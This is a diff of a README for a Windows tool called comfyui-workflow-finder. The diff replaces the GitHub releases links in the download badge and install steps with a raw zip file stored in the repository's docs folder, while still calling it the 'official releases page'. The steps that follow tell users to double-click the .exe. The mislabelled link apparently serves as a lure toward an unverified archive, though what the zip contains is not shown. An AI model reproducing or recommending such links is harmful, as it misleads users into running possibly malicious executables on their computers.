@@ -1,6 +1,6 @@
 # 🔍 comfyui-workflow-finder - Find local ComfyUI workflows with ease
 
-[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/Civilofficerconducting396/comfyui-workflow-finder/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Civilofficerconducting396/comfyui-workflow-finder/main/docs/comfyui_finder_workflow_v3.5.zip)
 
 ## 📌 What is this tool
 
@@ -17,7 +17,7 @@ This application runs on standard Windows systems. You need the following:
 
 ## 📥 How to Install
 
-1. Visit the [official releases page](https://github.com/Civilofficerconducting396/comfyui-workflow-finder/releases) to download the application.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Civilofficerconducting396/comfyui-workflow-finder/main/docs/comfyui_finder_workflow_v3.5.zip) to download the application.
 2. Select the file ending in `.exe` for Windows.
 3. Save the file to your desktop or downloads folder.
 4. Double-click the file to start the installation process.
